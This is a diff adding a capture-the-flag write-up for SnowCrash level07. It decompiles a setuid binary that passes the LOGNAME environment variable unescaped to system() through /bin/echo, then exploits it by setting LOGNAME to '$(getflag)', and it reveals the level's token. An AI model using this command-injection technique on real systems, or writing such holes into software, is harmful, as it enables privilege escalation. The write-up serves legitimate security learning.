@@ -1,0 +1,58 @@
+When we login as level07 we get a binary executable file called level07 : 
+
+level07@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+
+When we execute the binary flag07 we get the following output :
+
+level07@SnowCrash:~$ ./level07 
+level07
+
+It prints level07 which could by the name of the binary, or maybe the name of the directory or event the name of the user or something else. To know what's going on we should decompile the binary.
+
+Lets transfer the binary to a machine where proper tools are avalable to disassemble and analyse the binary.
+
+## Here 192.168.1.92 is my Virtual Machine session ip.
+## Your might be different.
+$> scp -P 4242 level07@192.168.1.92:/home/user/level07/level07 . 
+
+Once we have got the binary we can simply use RetDec to decompile the binary and get a C source code :
+
+$> retdec-decompiler.py level07
+
+And the C source code of the file level07 is as follows :
+
+-------------------------------------------------------------
+#include <stdint.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+// ------------------------ Functions -------------------------
+
+// From module:   /home/user/level07/level07.c
+// Address range: 0x8048514 - 0x80485a1
+// Line range:    6 - 24
+int main(int argc, char ** argv)
+{
+    int32_t v1 = getegid(); // 0x804851d
+    int32_t v2 = geteuid(); // 0x8048526
+    
+    setresgid(v1, v1, v1);
+    setresuid(v2, v2, v2);
+    
+    char * buffer = NULL; // bp-28
+    char * env_val = getenv("LOGNAME"); // 0x8048576
+    
+    asprintf(&buffer, "/bin/echo %s ", env_val);
+    return system(buffer);
+}
+-------------------------------------------------------------------
+
+Just by looking at the source code we can see that the program is printing the environment varaible LOGNAME which is level07 in the vm. So we can see this level is similar to level04 where we have a program that calls acho with a String that we can control (because we can change the environment variable value)
+
+To get the flag for this level all we need to do is change the environment variable LOGNAME so that echo calls the getflag program:
+
+level07@SnowCrash:~$ export LOGNAME='$(getflag)'
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
